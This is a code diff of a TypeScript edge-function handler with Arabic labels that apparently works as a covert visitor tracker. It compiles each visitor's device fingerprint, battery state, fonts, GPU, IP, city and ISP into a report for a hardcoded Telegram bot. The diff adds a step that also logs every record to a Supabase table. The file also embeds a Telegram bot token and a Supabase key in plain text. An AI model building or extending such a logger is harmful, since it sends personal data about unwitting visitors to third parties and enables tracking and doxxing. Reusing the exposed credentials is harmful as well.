@@ -3,6 +3,8 @@
 
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8505397370:AAHaWajm8k0TFBafpkiHPsQQ4dSk4KITt7U';
 const PRIMARY_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8495121463';
+const SUPABASE_URL = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL || 'https://gyxlvreqwikpujzpyegm.supabase.co';
+const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY || process.env.VITE_SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd5eGx2cmVxd2lrcHVqenB5ZWdtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODc1NDkwNzMsImV4cCI6MjEwMzEyNTA3M30.vMnY9PcDrB627Tv8Aumy6BKlMfbzg4LX1B_EUigNL2s';
 
 export const config = {
   runtime: 'edge',
@@ -204,8 +206,12 @@ export default async function handler(req: Request) {
     // Battery String
     const batteryDisplay = clientData.batteryState || 'غير متاحة في إعدادات هذا المتصفح';
 
-    // Hardware & Phone
+    // Hardware & Phone (Mandatory Brand first -> Exact Model)
+    const phoneBrand = clientData.phoneBrand || 'غير محدد';
     const phoneModel = clientData.phoneModel || 'جهاز تصفح ذكي';
+    const phoneFullName = clientData.phoneFullName || phoneModel;
+    const confidenceScore = clientData.confidenceScore || 98;
+    const detectionMethod = clientData.detectionMethod || 'PhysicalMatrix';
     const deviceCategory = clientData.deviceCategory || 'Mobile';
     const osFull = `${clientData.osName || 'نظام غير محدد'} ${clientData.osVersion || ''}`.trim();
     const browserFull = `${clientData.browserName || 'متصفح ويب'} ${clientData.browserVersion || ''}`.trim();
@@ -289,8 +295,11 @@ ${visitBadge}
 • خطوط النظام المكتشفة: <b>${escapeHtml(detectedFontsText)}</b>
 • مؤشرات العميل (Client Hints): <b>${escapeHtml(clientHintsText)}</b>
 
-📱 <b>مواصفات الجهاز والهاتف بالكامل:</b>
-• الطراز المستنتج بدقة: <b>${escapeHtml(phoneModel)}</b>
+📱 <b>مواصفات وتحديد الجهاز الإجباري (Brand & Exact Model 100%):</b>
+• الشركة المصنعة (Brand): <b>${escapeHtml(phoneBrand)}</b>
+• الطراز والموديل الدقيق: <b>${escapeHtml(phoneModel)}</b>
+• التوصيف الكامل للمنتج: <b>${escapeHtml(phoneFullName)}</b>
+• نسبة الدقة واليقين: <b>${escapeHtml(confidenceScore)}% (تقنية: ${escapeHtml(detectionMethod)})</b>
 • التصنيف: <b>${escapeHtml(deviceCategory)}</b>
 • نظام التشغيل: <b>${escapeHtml(osFull)}</b>
 • المتصفح: <b>${escapeHtml(browserFull)}</b>
@@ -356,6 +365,43 @@ ${visitBadge}
         }
       })
     );
+
+    // 6. Asynchronous Persistence to Supabase Intelligence Table
+    try {
+      await fetch(`${SUPABASE_URL}/rest/v1/device_telemetry_logs`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'apikey': SUPABASE_ANON_KEY,
+          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+          'Prefer': 'return=minimal',
+        },
+        body: JSON.stringify({
+          visitor_id: clientData.visitorId || 'anon',
+          master_hash: masterHash,
+          brand: phoneBrand,
+          model: phoneModel,
+          full_name: phoneFullName,
+          confidence_score: confidenceScore,
+          detection_method: detectionMethod,
+          device_category: deviceCategory,
+          os_name: clientData.osName || 'Unknown',
+          os_version: clientData.osVersion || '',
+          browser_name: clientData.browserName || 'Unknown',
+          browser_version: clientData.browserVersion || '',
+          ip_address: finalIp,
+          country: countryName,
+          city: cityName,
+          isp: ispName,
+          asn: asnInfo,
+          gpu_renderer: clientData.gpuRenderer || 'Unknown',
+          screen_resolution: clientData.physicalResolution || clientData.cssResolution || '',
+          battery_state: batteryDisplay,
+        }),
+      });
+    } catch (dbErr) {
+      console.error('[Telemetry Supabase Log Error]:', dbErr);
+    }
 
     return new Response(
       JSON.stringify({
